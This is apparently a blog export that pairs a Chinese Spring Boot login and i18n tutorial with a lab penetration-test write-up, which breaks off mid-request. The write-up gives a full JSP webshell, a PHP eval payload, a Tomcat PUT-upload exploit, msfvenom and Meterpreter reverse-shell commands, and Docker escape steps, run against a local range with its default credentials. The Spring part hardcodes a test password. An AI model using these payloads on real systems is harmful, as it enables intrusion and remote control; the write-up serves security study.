&lt;!-- Bootstrap core CSS -->\n    &lt;link th:href=\"@&#123;/css/bootstrap.min.css&#125;\" rel=\"stylesheet\">\n\n    &lt;!-- Custom styles for this template -->\n    &lt;link th:href=\"@&#123;/css/signin.css&#125;\" rel=\"stylesheet\">\n&lt;/head>\n\n&lt;body class=\"text-center\">\n&lt;form class=\"form-signin\">\n    &lt;img class=\"mb-4\" src=\"https://getbootstrap.com/docs/4.0/assets/brand/bootstrap-solid.svg\" alt=\"\" width=\"72\" height=\"72\">\n    &lt;h1 class=\"h3 mb-3 font-weight-normal\" th:text=\"#&#123;login.tip&#125;\">Please sign in&lt;/h1>\n    &lt;label for=\"inputEmail\" class=\"sr-only\">Email address&lt;/label>\n    &lt;input type=\"email\" id=\"inputEmail\" class=\"form-control\" placeholder=\"Email address\" required autofocus>\n    &lt;label for=\"inputPassword\" class=\"sr-only\">Password&lt;/label>\n    &lt;input type=\"password\" id=\"inputPassword\" class=\"form-control\" placeholder=\"Password\" required>\n    &lt;div class=\"checkbox mb-3\">\n        &lt;label>\n            &lt;input type=\"checkbox\" value=\"remember-me\"> Remember me\n        &lt;/label>\n    &lt;/div>\n    &lt;button class=\"btn btn-lg btn-primary btn-block\" type=\"submit\">Sign in&lt;/button>\n    &lt;p class=\"mt-5 mb-3 text-muted\">&amp;copy; 2017-2018&lt;/p>\n    &lt;a class=\"btn btn-sm\">中文&lt;/a>\n    &lt;a class=\"btn btn-sm\">English&lt;/a>\n&lt;/form>\n&lt;/body>\n&lt;/html>\n\n开启服务后访问\n\n此时已成功生效，接下来改其他的一些zh及en配置\n接下来同理修改html代码，具体如下\n\n&lt;!doctype html>\n&lt;html lang=\"en\" xmlns:th=\"http://www.thymeleaf.org\">\n&lt;head>\n    &lt;meta charset=\"utf-8\">\n    &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1, shrink-to-fit=no\">\n    &lt;meta name=\"description\" content=\"\">\n    &lt;meta name=\"author\" content=\"\">\n    &lt;link rel=\"icon\" th:href=\"@&#123;/favicon.ico&#125;\">\n\n    &lt;title>Signin Template for Bootstrap&lt;/title>\n\n    &lt;!-- Bootstrap core CSS -->\n    &lt;link th:href=\"@&#123;/css/bootstrap.min.css&#125;\" rel=\"stylesheet\">\n\n    &lt;!-- Custom styles for this template -->\n    &lt;link th:href=\"@&#123;/css/signin.css&#125;\" rel=\"stylesheet\">\n&lt;/head>\n\n&lt;body class=\"text-center\">\n&lt;form class=\"form-signin\">\n    &lt;img class=\"mb-4\" src=\"https://getbootstrap.com/docs/4.0/assets/brand/bootstrap-solid.svg\" alt=\"\" width=\"72\" height=\"72\">\n    &lt;h1 class=\"h3 mb-3 font-weight-normal\" th:text=\"#&#123;login.tip&#125;\">Please sign in&lt;/h1>\n    &lt;input type=\"text\"  class=\"form-control\" th:placeholder=\"#&#123;login.username&#125;\" required autofocus>\n    &lt;input type=\"password\" id=\"inputPassword\" class=\"form-control\" th:placeholder=\"#&#123;login.password&#125;\" required>\n    &lt;div class=\"checkbox mb-3\">\n        &lt;label>\n            &lt;input type=\"checkbox\" value=\"remember-me\">[[#&#123;login.remember&#125;]]\n        &lt;/label>\n    &lt;/div>\n    &lt;button class=\"btn btn-lg btn-primary btn-block\" type=\"submit\">[[#&#123;login.btn&#125;]]&lt;/button>\n    &lt;p class=\"mt-5 mb-3 text-muted\">&amp;copy; 2017-2018&lt;/p>\n    &lt;a class=\"btn btn-sm\">中文&lt;/a>\n    &lt;a class=\"btn btn-sm\">English&lt;/a>\n&lt;/form>\n&lt;/body>\n&lt;/html>\n\n\n\n\n\n然后接下来配置国际化的语言，它这个的话去MVC这个文件下寻找\n\n找到这个localeResolver方法，可以看出大致含义是当有配置的时候，就按自定义配置来，当没有配置的时候，就按照默认的来。\n所以接下来我们重写一个localeResolver方法，我们在config文件夹下新建一个MylocaleResolver文件，内容如下\n\nimport org.springframework.cglib.core.Local;\nimport org.springframework.web.servlet.LocaleResolver;\nimport org.thymeleaf.util.StringUtils;\n\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.util.Locale;\n\npublic class MyLocaleResolver implements LocaleResolver&#123;\n    //解析请求\n    @Override\n    public Locale resolveLocale(HttpServletRequest request) &#123;\n        //获取请求中的参数链接\n        String language = request.getParameter(\"l\");\n        Locale locale = Locale.getDefault();//如果没有就使用默认的;\n\n        //如果请求的参数携带了地区化的参数\n        if(!StringUtils.isEmpty(language))&#123;\n            String[] split =  language.split(\"_\");\n            //国家，地区\n           locale = new Locale(split[0],split[1]);\n        &#125;\n        return locale;\n    &#125;\n\n    @Override\n    public void setLocale(HttpServletRequest request, HttpServletResponse response, Locale locale) &#123;\n\n    &#125;\n&#125;\n\n而后我们还需要去MyMvcConfig.java中配置@Bean，这样才能使得这个函数生效，MyMvcConfig.java内容如下\n\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.context.annotation.Configuration;\nimport org.springframework.web.servlet.LocaleResolver;\nimport org.springframework.web.servlet.config.annotation.ViewControllerRegistry;\nimport org.springframework.web.servlet.config.annotation.WebMvcConfigurer;\n\n@Configuration\npublic class MyMvcConfig implements WebMvcConfigurer &#123;\n\n    @Override\n    public void addViewControllers(ViewControllerRegistry registry)&#123;\n        registry.addViewController(\"/\").setViewName(\"index\");\n        registry.addViewController(\"/index.html\").setViewName(\"index\");\n    &#125;\n    //自定义的国际化组件生效了\n    @Bean\n    public LocaleResolver localeResolver()&#123;\n        return  new MyLocaleResolver();\n    &#125;\n&#125;\n\n接下来打开网站\n\n点击English\n\n登录界面实现首先我们更改login.html中，添加如下代码\n&lt;form class=\"form-signin\" th:action=\"@&#123;/user/login&#125;\">\n\n接下来在Controller文件夹中写入loginController.java文件，通过RequestMapping写入路由，通过ResponseBody写入返回内容，具体内容如下\nimport org.springframework.stereotype.Controller;\nimport org.springframework.web.bind.annotation.RequestMapping;\nimport org.springframework.web.bind.annotation.ResponseBody;\n\n@Controller\npublic class LoginController &#123;\n        @RequestMapping(\"/user/login\")\n        @ResponseBody\n        public String login()&#123;\n            return \"Ok\";\n        &#125;\n&#125;\n\n\n\n接下来运行项目，随便填写一下登录信息\n\n成功写入\n接收参数的话，我们需要在html中加入name字段，因此对html文件进行更改\n&lt;input type=\"text\" name=\"username\" class=\"form-control\" th:placeholder=\"#&#123;login.username&#125;\" required autofocus>\n&lt;input type=\"password\" name=\"password\" id=\"inputPassword\" class=\"form-control\" th:placeholder=\"#&#123;login.password&#125;\" required>\n\n然后接下来在LoginController.java文件中更改内容，添加校验，当登录成功时跳转到另一界面，登录失败则仍在当前登录界面，这里的话保险起见，在这里加入**RequestParam()**用于接收参数。\n具体内容如下\n\nimport org.springframework.stereotype.Controller;\nimport org.springframework.ui.Model;\nimport org.springframework.web.bind.annotation.RequestMapping;\nimport org.springframework.web.bind.annotation.RequestParam;\nimport org.thymeleaf.util.StringUtils;\n\n@Controller\npublic class LoginController &#123;\n        @RequestMapping(\"/user/login\")\n        public String login(\n                @RequestParam(\"username\") String username,\n                @RequestParam(\"password\") String password,\n                Model model)&#123;\n\n            //具体的业务;\n            if (!StringUtils.isEmpty(username) &amp;&amp; \"123456\".equals(password))&#123;\n                return \"dashboard\";\n            &#125;else&#123;\n                //告诉用户，登录失败\n                model.addAttribute(\"msg\",\"登录失败\");\n                return \"index\";\n            &#125;\n        &#125;\n&#125;\n\n接下来写一下跳转的界面，即dashboard.html文件，内容如下\n\n&lt;!doctype html>\n&lt;html lang=\"en\">\n&lt;head>\n  &lt;meta charset=\"utf-8\">\n  &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1, shrink-to-fit=no\">\n  &lt;meta name=\"description\" content=\"\">\n  &lt;meta name=\"author\" content=\"\">\n  &lt;link rel=\"icon\" th:href=\"@&#123;/favicon.ico&#125;\">\n\n  &lt;title>Dashboard Template for Bootstrap&lt;/title>\n\n\n  &lt;!-- Bootstrap core CSS -->\n  &lt;link th:href=\"@&#123;/css/bootstrap.min.css&#125;\" rel=\"stylesheet\">\n\n  &lt;!-- Custom styles for this template -->\n  &lt;link th:href=\"@&#123;/css/dashboard.css&#125;\" rel=\"stylesheet\">\n&lt;/head>\n\n&lt;body>\n&lt;nav class=\"navbar navbar-dark sticky-top bg-dark flex-md-nowrap p-0\">\n  &lt;a class=\"navbar-brand col-sm-3 col-md-2 mr-0\" href=\"#\">Company name&lt;/a>\n  &lt;input class=\"form-control form-control-dark w-100\" type=\"text\" placeholder=\"Search\" aria-label=\"Search\">\n  &lt;ul class=\"navbar-nav px-3\">\n    &lt;li class=\"nav-item text-nowrap\">\n      &lt;a class=\"nav-link\" href=\"#\">Sign out&lt;/a>\n    &lt;/li>\n  &lt;/ul>\n&lt;/nav>\n\n&lt;div class=\"container-fluid\">\n  &lt;div class=\"row\">\n    &lt;nav class=\"col-md-2 d-none d-md-block bg-light sidebar\">\n      &lt;div class=\"sidebar-sticky\">\n        &lt;ul class=\"nav flex-column\">\n          &lt;li class=\"nav-item\">\n            &lt;a class=\"nav-link active\" href=\"#\">\n              &lt;span data-feather=\"home\">&lt;/span>\n              Dashboard &lt;span class=\"sr-only\">(current)&lt;/span>\n            &lt;/a>\n          &lt;/li>\n          &lt;li class=\"nav-item\">\n            &lt;a class=\"nav-link\" href=\"#\">\n              &lt;span data-feather=\"file\">&lt;/span>\n              Orders\n            &lt;/a>\n          &lt;/li>\n          &lt;li class=\"nav-item\">\n            &lt;a class=\"nav-link\" href=\"#\">\n              &lt;span data-feather=\"shopping-cart\">&lt;/span>\n              Products\n            &lt;/a>\n          &lt;/li>\n          &lt;li class=\"nav-item\">\n            &lt;a class=\"nav-link\" href=\"#\">\n              &lt;span data-feather=\"users\">&lt;/span>\n              Customers\n            &lt;/a>\n          &lt;/li>\n          &lt;li class=\"nav-item\">\n            &lt;a class=\"nav-link\" href=\"#\">\n              &lt;span data-feather=\"bar-chart-2\">&lt;/span>\n              Reports\n            &lt;/a>\n          &lt;/li>\n          &lt;li class=\"nav-item\">\n            &lt;a class=\"nav-link\" href=\"#\">\n              &lt;span data-feather=\"layers\">&lt;/span>\n              Integrations\n            &lt;/a>\n          &lt;/li>\n        &lt;/ul>\n\n        &lt;h6 class=\"sidebar-heading d-flex justify-content-between align-items-center px-3 mt-4 mb-1 text-muted\">\n          &lt;span>Saved reports&lt;/span>\n          &lt;a class=\"d-flex align-items-center text-muted\" href=\"#\">\n            &lt;span data-feather=\"plus-circle\">&lt;/span>\n          &lt;/a>\n        &lt;/h6>\n        &lt;ul class=\"nav flex-column mb-2\">\n          &lt;li class=\"nav-item\">\n            &lt;a class=\"nav-link\" href=\"#\">\n              &lt;span data-feather=\"file-text\">&lt;/span>\n              Current month\n            &lt;/a>\n          &lt;/li>\n          &lt;li class=\"nav-item\">\n            &lt;a class=\"nav-link\" href=\"#\">\n              &lt;span data-feather=\"file-text\">&lt;/span>\n              Last quarter\n            &lt;/a>\n          &lt;/li>\n          &lt;li class=\"nav-item\">\n            &lt;a class=\"nav-link\" href=\"#\">\n              &lt;span data-feather=\"file-text\">&lt;/span>\n              Social engagement\n            &lt;/a>\n          &lt;/li>\n          &lt;li class=\"nav-item\">\n            &lt;a class=\"nav-link\" href=\"#\">\n              &lt;span data-feather=\"file-text\">&lt;/span>\n              Year-end sale\n            &lt;/a>\n          &lt;/li>\n        &lt;/ul>\n      &lt;/div>\n    &lt;/nav>\n\n    &lt;main role=\"main\" class=\"col-md-9 ml-sm-auto col-lg-10 pt-3 px-4\">\n      &lt;div class=\"d-flex justify-content-between flex-wrap flex-md-nowrap align-items-center pb-2 mb-3 border-bottom\">\n        &lt;h1 class=\"h2\">Dashboard&lt;/h1>\n        &lt;div class=\"btn-toolbar mb-2 mb-md-0\">\n          &lt;div class=\"btn-group mr-2\">\n            &lt;button class=\"btn btn-sm btn-outline-secondary\">Share&lt;/button>\n            &lt;button class=\"btn btn-sm btn-outline-secondary\">Export&lt;/button>\n          &lt;/div>\n          &lt;button class=\"btn btn-sm btn-outline-secondary dropdown-toggle\">\n            &lt;span data-feather=\"calendar\">&lt;/span>\n            This week\n          &lt;/button>\n        &lt;/div>\n      &lt;/div>\n\n      &lt;canvas class=\"my-4\" id=\"myChart\" width=\"900\" height=\"380\">&lt;/canvas>\n\n      &lt;h2>Section title&lt;/h2>\n      &lt;div class=\"table-responsive\">\n        &lt;table class=\"table table-striped table-sm\">\n          &lt;thead>\n          &lt;tr>\n            &lt;th>#&lt;/th>\n            &lt;th>Header&lt;/th>\n            &lt;th>Header&lt;/th>\n            &lt;th>Header&lt;/th>\n            &lt;th>Header&lt;/th>\n          &lt;/tr>\n          &lt;/thead>\n          &lt;tbody>\n          &lt;tr>\n            &lt;td>1,001&lt;/td>\n            &lt;td>Lorem&lt;/td>\n            &lt;td>ipsum&lt;/td>\n            &lt;td>dolor&lt;/td>\n            &lt;td>sit&lt;/td>\n          &lt;/tr>\n          &lt;tr>\n            &lt;td>1,002&lt;/td>\n            &lt;td>amet&lt;/td>\n            &lt;td>consectetur&lt;/td>\n            &lt;td>adipiscing&lt;/td>\n            &lt;td>elit&lt;/td>\n          &lt;/tr>\n          &lt;tr>\n            &lt;td>1,003&lt;/td>\n            &lt;td>Integer&lt;/td>\n            &lt;td>nec&lt;/td>\n            &lt;td>odio&lt;/td>\n            &lt;td>Praesent&lt;/td>\n          &lt;/tr>\n          &lt;tr>\n            &lt;td>1,003&lt;/td>\n            &lt;td>libero&lt;/td>\n            &lt;td>Sed&lt;/td>\n            &lt;td>cursus&lt;/td>\n            &lt;td>ante&lt;/td>\n          &lt;/tr>\n          &lt;tr>\n            &lt;td>1,004&lt;/td>\n            &lt;td>dapibus&lt;/td>\n            &lt;td>diam&lt;/td>\n            &lt;td>Sed&lt;/td>\n            &lt;td>nisi&lt;/td>\n          &lt;/tr>\n          &lt;tr>\n            &lt;td>1,005&lt;/td>\n            &lt;td>Nulla&lt;/td>\n            &lt;td>quis&lt;/td>\n            &lt;td>sem&lt;/td>\n            &lt;td>at&lt;/td>\n          &lt;/tr>\n          &lt;tr>\n            &lt;td>1,006&lt;/td>\n            &lt;td>nibh&lt;/td>\n            &lt;td>elementum&lt;/td>\n            &lt;td>imperdiet&lt;/td>\n            &lt;td>Duis&lt;/td>\n          &lt;/tr>\n          &lt;tr>\n            &lt;td>1,007&lt;/td>\n            &lt;td>sagittis&lt;/td>\n            &lt;td>ipsum&lt;/td>\n            &lt;td>Praesent&lt;/td>\n            &lt;td>mauris&lt;/td>\n          &lt;/tr>\n          &lt;tr>\n            &lt;td>1,008&lt;/td>\n            &lt;td>Fusce&lt;/td>\n            &lt;td>nec&lt;/td>\n            &lt;td>tellus&lt;/td>\n            &lt;td>sed&lt;/td>\n          &lt;/tr>\n          &lt;tr>\n            &lt;td>1,009&lt;/td>\n            &lt;td>augue&lt;/td>\n            &lt;td>semper&lt;/td>\n            &lt;td>porta&lt;/td>\n            &lt;td>Mauris&lt;/td>\n          &lt;/tr>\n          &lt;tr>\n            &lt;td>1,010&lt;/td>\n            &lt;td>massa&lt;/td>\n            &lt;td>Vestibulum&lt;/td>\n            &lt;td>lacinia&lt;/td>\n            &lt;td>arcu&lt;/td>\n          &lt;/tr>\n          &lt;tr>\n            &lt;td>1,011&lt;/td>\n            &lt;td>eget&lt;/td>\n            &lt;td>nulla&lt;/td>\n            &lt;td>Class&lt;/td>\n            &lt;td>aptent&lt;/td>\n          &lt;/tr>\n          &lt;tr>\n            &lt;td>1,012&lt;/td>\n            &lt;td>taciti&lt;/td>\n            &lt;td>sociosqu&lt;/td>\n            &lt;td>ad&lt;/td>\n            &lt;td>litora&lt;/td>\n          &lt;/tr>\n          &lt;tr>\n            &lt;td>1,013&lt;/td>\n            &lt;td>torquent&lt;/td>\n            &lt;td>per&lt;/td>\n            &lt;td>conubia&lt;/td>\n            &lt;td>nostra&lt;/td>\n          &lt;/tr>\n          &lt;tr>\n            &lt;td>1,014&lt;/td>\n            &lt;td>per&lt;/td>\n            &lt;td>inceptos&lt;/td>\n            &lt;td>himenaeos&lt;/td>\n            &lt;td>Curabitur&lt;/td>\n          &lt;/tr>\n          &lt;tr>\n            &lt;td>1,015&lt;/td>\n            &lt;td>sodales&lt;/td>\n            &lt;td>ligula&lt;/td>\n            &lt;td>in&lt;/td>\n            &lt;td>libero&lt;/td>\n          &lt;/tr>\n          &lt;/tbody>\n        &lt;/table>\n      &lt;/div>\n    &lt;/main>\n  &lt;/div>\n&lt;/div>\n\n&lt;!-- Bootstrap core JavaScript\n================================================== -->\n&lt;!-- Placed at the end of the document so the pages load faster -->\n&lt;script th:href=\"@&#123;/js/jquery-3.2.1.slim.min.js&#125;\" integrity=\"sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN\" crossorigin=\"anonymous\">&lt;/script>\n&lt;script>window.jQuery || document.write('&lt;script th:href=\"@&#123;/js/jquery-3.2.1.slim.min.js&#125;\">&lt;\\/script>')&lt;/script>\n&lt;script th:href=\"@&#123;/js/vendor/popper.min.js&#125;\">&lt;/script>\n&lt;script th:href=\"@&#123;/js/bootstrap.min.js&#125;\">&lt;/script>\n\n&lt;!-- Icons -->\n&lt;script th:href=\"@&#123;/js/feather.min.js&#125;\">&lt;/script>\n&lt;script>\n  feather.replace()\n&lt;/script>\n\n&lt;script>\n  var ctx = document.getElementById(\"myChart\");\n  var myChart = new Chart(ctx, &#123;\n    type: 'line',\n    data: &#123;\n      labels: [\"Sunday\", \"Monday\", \"Tuesday\", \"Wednesday\", \"Thursday\", \"Friday\", \"Saturday\"],\n      datasets: [&#123;\n        data: [15339, 21345, 18483, 24003, 23489, 24092, 12034],\n        lineTension: 0,\n        backgroundColor: 'transparent',\n        borderColor: '#007bff',\n        borderWidth: 4,\n        pointBackgroundColor: '#007bff'\n      &#125;]\n    &#125;,\n    options: &#123;\n      scales: &#123;\n        yAxes: [&#123;\n          ticks: &#123;\n            beginAtZero: false\n          &#125;\n        &#125;]\n      &#125;,\n      legend: &#123;\n        display: false,\n      &#125;\n    &#125;\n  &#125;);\n&lt;/script>\n&lt;/body>\n&lt;/html>\n\n此时运行项目\n点击登录后\n\n成功进入后台，但此时如果输错密码，是没有提示的，所以我们需要再设置一个消息提示，当输入密码错误时回显错误信息。\n此时再去index.html下添加一行代码\n//如果登录成功，则不显示消息(通过th:if进行判断的)\n&lt;P style=\"color: red\"th:text=\"$&#123;msg&#125;\" th:if=\"$&#123;not #strings.isEmpty(msg)&#125;\">&lt;/P>\n\n打开界面再次进行尝试\n\n但此时的URL不是很美观\n\n我们可以添加一个在MyMvcConfig.java中添加一个视图\nregistry.addViewController(\"/main.html\").setViewName(\"dashboard\");\n\n\n\n\n而后简单更改下LoginController.java，加一个页面重定向\n\n登录拦截器在Config文件下写入LoginHandleInterceptor.java文件，内容如下\nimport org.springframework.web.servlet.HandlerInterceptor;\n\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport javax.xml.ws.handler.Handler;\n\npublic class LoginHandlerlnterceptor implements HandlerInterceptor &#123;\n    @Override\n    public boolean preHandle(HttpServletRequest request, HttpServletResponse response,Object handler) throws Exception&#123;\n        //登录成功后，应有用户的session\n        Object loginUser = request.getSession().getAttribute(\"loginUser\");\n\n        if (loginUser==null)&#123;//没有登录\n            request.setAttribute(\"msg\",\"没有权限，请登录\");\n            request.getRequestDispatcher(\"/index.html\").forward(request,response);//请求转发\n            return false;\n        &#125;else&#123;\n            return true;\n        &#125;\n    &#125;\n&#125;\n\n这个是通过session来校验是否登录的，所以我们需要在登录成功后添加session，修改LoginController.java内容如下\nimport org.springframework.stereotype.Controller;\nimport org.springframework.ui.Model;\nimport org.springframework.web.bind.annotation.RequestMapping;\nimport org.springframework.web.bind.annotation.RequestParam;\nimport org.thymeleaf.util.StringUtils;\n\nimport javax.servlet.http.HttpSession;\n\n@Controller\npublic class LoginController &#123;\n        @RequestMapping(\"/user/login\")\n        public String login(\n                @RequestParam(\"username\") String username,\n                @RequestParam(\"password\") String password,\n                Model model, HttpSession session)&#123;\n\n            //具体的业务;\n            if (!StringUtils.isEmpty(username) &amp;&amp; \"123456\".equals(password))&#123;\n                session.setAttribute(\"loginUser\",username);\n                return \"redirect:/main.html\";\n            &#125;else&#123;\n                //告诉用户，登录失败\n                model.addAttribute(\"msg\",\"登录失败\");\n                return \"index\";\n            &#125;\n        &#125;\n&#125;\n\n而后我们这是自定义类，所以还需要在MyMvcConfig.java下添加@Bean注释，添加自定义函数，具体内容如下\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.context.annotation.Configuration;\nimport org.springframework.web.servlet.LocaleResolver;\nimport org.springframework.web.servlet.config.annotation.InterceptorRegistry;\nimport org.springframework.web.servlet.config.annotation.ViewControllerRegistry;\nimport org.springframework.web.servlet.config.annotation.WebMvcConfigurer;\n\n@Configuration\npublic class MyMvcConfig implements WebMvcConfigurer &#123;\n\n    @Override\n    public void addViewControllers(ViewControllerRegistry registry)&#123;\n        registry.addViewController(\"/\").setViewName(\"index\");\n        registry.addViewController(\"/index.html\").setViewName(\"index\");\n        registry.addViewController(\"/main.html\").setViewName(\"dashboard\");\n    &#125;\n    //自定义的国际化组件生效了\n    @Bean\n    public LocaleResolver localeResolver()&#123;\n        return  new MyLocaleResolver();\n    &#125;\n\n    @Override\n    public void addInterceptors(InterceptorRegistry registry) &#123;\n        registry.addInterceptor(new LoginHandlerlnterceptor()).addPathPatterns(\"/**\").excludePathPatterns(\"/index.html\",\"/\",\"/user/login\",\"/css/**\",\"/js/**\",\"\");\n    &#125;\n&#125;\n\n此时便已实现拦截器大致功能。\n在前端加入[[$&#123;session.loginUser&#125;]]，可以输出用户名。\n","slug":"Spring boot 从0到0.1","date":"2023-04-17T09:54:30.000Z","categories_index":"JAVA","tags_index":"语言学习","author_index":"quan9i"},{"id":"6a98a1dbb5c5e5a32e4331613d5b5f80","title":"内网靶场实战——ATT&CK实战系列（四）","content":"环境搭建环境地址如下：\nhttp://39.98.79.56/vuln/detail/6/\n接下来下载好后在VmWare中进行ovf导入即可，共计三个文件\n接下来配置网络环境，在虚拟网络编辑器中添加两个网段\n1、192.168.1.0 NAT模式 用于外网\n2、192.168.183.0 仅主机模式 用于内网\n\n\n接下来给三个虚拟机以及攻击机(kali)进行分配\nDC: VMet8(192.168.183.130)\nWeb(Ubuntu): VMet4、VMet8(192.168.1.130、192.168.183.128)\nWin7: VMet8(192.168.183.129)\nKali: VMet4(192.168.1.129)\n\n开机账密如下\nweb(ubuntu): ubuntu\nwin7 douser: Dotest123\nDC: administrator: Test2008 \n\n接下来用Kali虚拟机去pingUbuntu\n\n尝试Ubuntu虚拟机去pingDC域控\n\n尝试Win7虚拟机去pingDC域控\n\n尝试DC域控ping另外两台域内机器\n\n皆可ping通，至此环境搭建完成，接下来在ubuntu虚拟机中开启环境\nsudo su\ndocker ps -a //查看以往开启容器\ndocker start ec814f6ee002 \ndocker start 174745108fcb\ndocker start 09dd4e5bfa91\ndocker start ad7866b3df9b\ndocker ps //查看当前运行容器\n\n\n\n\n外网打点打开Kali，先用nmap对外网192.168.1.130进行扫描\nnmap -p1-65535 -Pn -A -T4 192.168.1.130\n//-p1-65535 指扫描1-65535端口\n//-Pn 指不被主机发现\n// -A 指进行操作系统指纹识别\n// -T4 指扫描速度最快\n\n\n\n\nPHPMyadmin扫描探测出2003端口开放phpmyadmin服务，接下来访问看是否能写入文件\n\n回显NULL，即禁止写入，只能再找其他方法了\n在nmap扫描后注意到Phpmyadmin版本为4.8.1，在网上搜索相关漏洞\n\n发现远程文件包含漏洞，简单了解过后发现思路就是写一个恶意查询语句，例如select &#39;&lt;?phpinfo();?&gt;&#39;，然后包含有这个语句的日志文件，即可实现远程文件包含，我们的RCE也从中得来（更换php内容为一句话木马即可）。\n所以接下来查询一下日志状态\nSELECT '&lt;?php @eval($_POST[1]);?>'\n\n\n发现日志处于关闭状态，我们进行开启\nSET GLOBAL general_log='on'\n\n\n这里发现权限不足，无法开启，因此我们无法通过开启日志的方法来进行写入shell，而禁止导入导出也注定我们无法去直接写shell，因此这个服务放弃，切换另一个。\nTomcat getshell接下来看向2002端口，它是一个Apache Tomcat 8.5.19服务，搜索相关漏洞\n\n发现CVE-2017-12615，尝试复现\n访问2002端口，并抓包\n\n修改方法为PUT，上传jsp一句话木马\n注：直接写shell.jsp无法上传，我们可以用三种方式绕过，shell.jsp/ 或shell.jsp::$DATA 或 shell.jsp%20\n一句话木马内容如下\n&lt;%@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"%>&lt;%!class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;%>&lt;%if (request.getMethod().equals(\"POST\"))&#123;String k=\"e45e329feb5d925b\";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/session.putValue(\"u\",k);Cipher c=Cipher.getInstance(\"AES\");c.init(2,new SecretKeySpec(k.getBytes(),\"AES\"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);&#125;%>\n\n\n\n\n接下来用冰蝎连接\n\n成功getshell\nStruts2发现2001端口为Struts2服务，用漏扫工具扫描出漏洞，亦可getshell\n\nMsf上线由于冰蝎这种是非交互式的shell，所以我们需要进行反弹shell来得到一个可交互shell，这里直接上线msf\n首先在kali处进入msf，开启监听\nmsfconsole  //进入框架\nuse exploit/multi/handler                      //载入模块\nset payload java/meterpreter/reverse_tcp    //加载攻击负载核\nset lhost 192.168.1.129                   //设置本地监听地址\nset lport 7777                          //设置本地监听端口\nrun                            //开始执行，等待目标上线\n\n而后在冰蝎进行对应即可\n\n此时成功上线msf，接下来sessions 1 即可进入会话\n\n方法二除了利用冰蝎进行反弹shell，我们也可以通过生成msf木马，然后上传到服务器去执行来获取shell\n具体如下\n首先生成msf木马\nmsfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.129 LPORT=7777 -f elf >shell.elf\n\n接下来开启另一个终端，对本机7777端口进行监听\nmsfconsole\nuse exploit/multi/handler\nset lhost 192.168.1.129\nset lport 7777\nset payload linux/x86/meterpreter/reverse_tcp\nrun\n\n将木马上传至var/tmp目录下，接下来chmod +x shell.elf赋予执行权限，而后./shell.elf执行木马文件\n\n此时查看msf\n\n成功上线\nDocker逃逸执行ip -addr查看当前ip\n\n发现是172.xx，怀疑是docker环境，对于docker的验证，我们有如下两个方法\n是否存在.dockerenv文件:\ndocker环境下存在：ls -alh /.dockerenv 文件\n\n查询系统进程的cgroup信息:\ndocker环境下 cat /proc/1/cgroup\n\n\n说明的确是docker环境，我们想进一步渗透，必须进行容器逃逸，到服务器中。接下来寻找Docker逃逸的漏洞，找到这篇文章\nhttps://www.freebuf.com/articles/container/242763.html\n1、Dirty Cow（CVE-2016-5195）：Linux内核中的权限提升漏洞\n2、CVE-2019-5736\n3、emote api 未授权访问\n\nCVE-2019-57361、漏洞原理：Docker、containerd或者其他基于runc的容器在运行时存在安全漏洞，攻击者可以通过特定的容器镜像或者exec操作获取到宿主机runc执行时的文件句柄并修改掉runc的二进制文件，从而获取到宿主机的root执行权限。\n2、影响版本：\ndocker version &lt;=18.09.2\nRunC version &lt;=1.0-rc6\n\n3、尝试\n首先将payload下载到kali中,Poc链接https://github.com/Frichetten/CVE-2019-5736-PoC\n接下来需要修改一下payload，改成如下形式即可(即反弹shell指令)\n\n而后因为这个是go文件，我们需要下载go环境\nsudo apt-get update\nsudo apt install gccgo-go \nsudo apt install golang-go\n\n接下来对Poc文件进行编译\nsource /etc/profile   //配置go环境\n \nCGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build main.go  //编译生成\n\n而后进入msf，将这个go文件进行上传\nupload /tools/dockerrun/main\n\n\n可以看到成功上传，接下来在kali处监听8888端口(nc -lvnp 8888)\n\n接下来回到msf中，给main文件附加权限，并执行\n\n此时虽回显成功，但在kali中并未接收到shell，因此这个方法不可行。\n特权模式逃逸利用docker的特权模式来在宿主机硬盘中写入ssh私钥，实现ssh免密登录宿主机，从而实现对目标宿主机的控制。\n详细介绍如下\n特权模式于版本0.6时被引入Docker，允许容器内的root拥有外部物理机root权限，而此前容器内root用户仅拥有外部物理机普通用户权限。\n使用特权模式启动容器，可以获取大量设备文件访问权限。因为当管理员执行docker run —privileged时，Docker容器将被允许访问主机上的所有设备，并可以执行mount命令进行挂载。\n当控制使用特权模式启动的容器时，docker管理员可通过mount命令将外部宿主机磁盘设备挂载进容器内部，获取对整个宿主机的文件读写权限，此外还可以通过写入计划任务等方式在宿主机执行命令。\n\n\n\n第一步，挂载磁盘\nfdisk -l //查看磁盘分区情况\nmkdir /qwq //新建目录qwq\nmount /dev/sda1 /qwq //挂载到新目录\n\n\n\n\n我们这里发现sda1在/dev/sda1下，我们新建个目录并将/dev/sda1挂载到新目录下。\n此时执行ls /qwq，若有回显则说明成功挂载。\nemm，突然执行命令无回显了，所以我重新上传了一个jsp木马\nPUT /shell.jsp/ HTTP/1.1\nHost: 192.168.1.130:2002\nPragma: no-cache\nCache-Control: no-cache\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nAccept-Encoding: gzip, deflate\nAccept-Language: 